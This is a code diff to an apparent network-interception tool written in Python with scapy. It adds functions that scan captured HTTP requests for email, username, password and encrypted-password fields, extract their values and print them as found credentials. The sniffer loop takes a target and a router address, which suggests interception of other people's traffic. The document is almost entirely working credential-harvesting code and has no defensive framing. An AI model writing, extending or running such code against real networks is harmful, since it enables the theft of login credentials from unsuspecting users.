@@ -16,9 +16,35 @@ RED = Fore.RED
 BLUE = Fore.BLUE
 RESET = Fore.RESET
 
+def extract_creds(index_to_start_from, given_text):
+    extracted_creds = ""
+    did_amp_happen = False
 
-def return_password_from_packet():
-    pass
+    search_from_text = given_text[index_to_start_from:]
+
+    for character in search_from_text:
+        if character == "&" and did_amp_happen:
+            break
+        if character == "&":
+            did_amp_happen = True
+            continue
+        extracted_creds += character
+
+    return extracted_creds
+
+
+def print_creds_from_packet(request_to_filter_out, printing_queue):
+    dictionary_of_keywords = {"email=": -1, "&encpass=": -1, "username=": -1, "&pass=":-1}
+    phrases_to_check = dictionary_of_keywords.keys()
+
+    for phrase_to_check in phrases_to_check:
+        dictionary_of_keywords[phrase_to_check] = request_to_filter_out.find(phrase_to_check)
+
+    for creds_to_extract in phrases_to_check:
+        current_index = dictionary_of_keywords[creds_to_extract]
+        if current_index != -1:
+            extracted_creds = extract_creds(current_index, request_to_filter_out)
+            printing_queue.put(f"{GREEN}[+] Found creds: {extracted_creds}{RESET}")
 
 
 def process_http_packet(local_packet, printing_queue, verbosity):
@@ -40,7 +66,7 @@ def packet_handler(packet_to_process, target, router_ip, printing_queue, verbosi
 
     # if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
     #     print(packet_to_process)
-        # process_dns_packet(packet_to_process, target,router_ip)
+    # process_dns_packet(packet_to_process, target,router_ip)
 
 
 def sniffer_loop_scapy(interface_to_capture_packets, target, router_ip, printing_queue, verbosity, cancel_token):
@@ -48,7 +74,8 @@ def sniffer_loop_scapy(interface_to_capture_packets, target, router_ip, printing
         printing_queue.put(f"{GREEN}[+] Starting sniffer{RESET}")
     while not cancel_token.is_set():
         sniff(iface=interface_to_capture_packets,
-              prn=lambda packet_to_process: packet_handler(packet_to_process, target, router_ip, printing_queue, verbosity),
+              prn=lambda packet_to_process: packet_handler(packet_to_process, target, router_ip, printing_queue,
+                                                           verbosity),
               store=0, count=1)
     # sniff(prn=process_packet, filter="port 80", store=False)
 
